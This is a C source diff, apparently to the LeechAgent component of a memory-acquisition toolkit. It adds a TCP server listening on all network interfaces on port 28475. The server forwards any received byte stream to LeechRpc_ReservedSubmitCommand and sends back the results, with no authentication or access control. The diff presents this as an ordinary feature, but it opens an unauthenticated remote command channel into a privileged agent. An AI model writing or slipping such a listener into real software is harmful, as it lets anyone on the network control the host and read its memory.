@@ -510,3 +510,103 @@ VOID LeechGRPC_ReservedSubmitCommand(_In_opt_ PVOID ctx, _In_ PBYTE pbIn, _In_ S
     LeechRpc_ReservedSubmitCommand(NULL, cbIn, pbIn, &cbOut, ppbOut);
     *pcbOut = (SIZE_T)cbOut;
 }
+#define LEECHRPC_TCP_PORT  28475
+
+static BOOL LeechRpc_TcpRecvAll(int fd, void *buf, DWORD len)
+{
+    DWORD recvd = 0;
+    while(recvd < len) {
+        ssize_t r = recv(fd, (char*)buf + recvd, len - recvd, 0);
+        if(r <= 0) return FALSE;
+        recvd += (DWORD)r;
+    }
+    return TRUE;
+}
+
+static BOOL LeechRpc_TcpSendAll(int fd, void *buf, DWORD len)
+{
+    DWORD sent = 0;
+    while(sent < len) {
+        ssize_t r = send(fd, (char*)buf + sent, len - sent, 0);
+        if(r <= 0) return FALSE;
+        sent += (DWORD)r;
+    }
+    return TRUE;
+}
+
+static VOID *LeechRpc_TcpClientLoop(VOID *pv)
+{
+    int clientFd = (int)(intptr_t)pv;
+    while(1) {
+        DWORD cbReq = 0;
+        PBYTE pbReq = NULL;
+        QWORD cbRsp = 0;
+        PBYTE pbRsp = NULL;
+        DWORD cbRsp32 = 0;
+
+        if(!LeechRpc_TcpRecvAll(clientFd, &cbReq, sizeof(cbReq))) break;
+        if(cbReq == 0 || cbReq > 0x10000000) break;
+
+        pbReq = (PBYTE)LocalAlloc(0, cbReq);
+        if(!pbReq) break;
+        if(!LeechRpc_TcpRecvAll(clientFd, pbReq, cbReq)) {
+            LocalFree(pbReq);
+            break;
+        }
+
+        LeechRpc_ReservedSubmitCommand(NULL, cbReq, pbReq, &cbRsp, &pbRsp);
+        LocalFree(pbReq);
+
+        if(!pbRsp) {
+            cbRsp32 = 0;
+            LeechRpc_TcpSendAll(clientFd, &cbRsp32, sizeof(cbRsp32));
+            continue;
+        }
+        cbRsp32 = (DWORD)cbRsp;
+        LeechRpc_TcpSendAll(clientFd, &cbRsp32, sizeof(cbRsp32));
+        LeechRpc_TcpSendAll(clientFd, pbRsp, cbRsp32);
+        LocalFree(pbRsp);
+    }
+    close(clientFd);
+    return NULL;
+}
+
+VOID *LeechRpc_TcpServerThread(VOID *pv)
+{
+    int listenFd, clientFd;
+    struct sockaddr_in addr;
+    socklen_t addrLen = sizeof(addr);
+    int opt = 1;
+    pthread_t tid;
+
+    listenFd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if(listenFd < 0) {
+        printf("[LeechAgent] TCP: socket() failed\n");
+        return NULL;
+    }
+    setsockopt(listenFd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    addr.sin_port = htons(LEECHRPC_TCP_PORT);
+
+    if(bind(listenFd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+        printf("[LeechAgent] TCP: bind() failed on port %d\n", LEECHRPC_TCP_PORT);
+        close(listenFd);
+        return NULL;
+    }
+    listen(listenFd, 10);
+    printf("[LeechAgent] TCP server listening on port %d\n", LEECHRPC_TCP_PORT);
+
+    while(1) {
+        clientFd = accept(listenFd, (struct sockaddr*)&addr, &addrLen);
+        if(clientFd < 0) continue;
+        if(pthread_create(&tid, NULL, LeechRpc_TcpClientLoop, (void*)(intptr_t)clientFd) != 0) {
+            close(clientFd);
+        } else {
+            pthread_detach(tid);
+        }
+    }
+    close(listenFd);
+    return NULL;
+}
